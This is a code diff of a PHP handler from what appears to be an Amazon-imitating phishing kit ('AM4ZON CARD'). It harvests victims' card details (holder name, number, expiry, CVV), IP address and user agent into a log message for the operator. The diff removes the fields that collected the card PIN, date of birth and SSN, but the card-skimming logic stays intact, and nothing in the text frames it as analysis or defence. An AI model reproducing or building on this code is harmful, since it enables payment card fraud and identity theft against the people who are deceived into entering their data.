@@ -17,9 +17,6 @@ $holder .= $_POST['holder'];
 $ccnum .= $_POST['ccnum'];
 $ccexp .= $_POST['EXP1']."/".$_POST['EXP2'];
 $cvv2 .= $_POST['cvv2'];
-$vbv .= $_POST['vbv'];
-$dob .= $_POST['dob'];
-$ssn .= $_POST['ssn'];
 
 # Logs
 $message .= "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
@@ -27,9 +24,6 @@ $message .= "➤ [ Card Name ] : {$holder}\n";
 $message .= "➤ [ Card Num ] : {$ccnum}\n";
 $message .= "➤ [ Card Exp ] : {$ccexp}\n";
 $message .= "➤ [ Card Cvv ] : {$cvv2}\n";
-$message .= "➤ [ Card Pin ] : {$vbv}\n";
-$message .= "➤ [ Card Dob ] : {$dob}\n";
-$message .= "➤ [ Card Ssn ] : {$ssn}\n";
 $message .= "--------- MORE INFO -----------\n";
 $message .= "➤ [ IP Address ] : {$IP}\n";
 $message .= "➤ [ User-Agent ] : {$user_agent}\n";
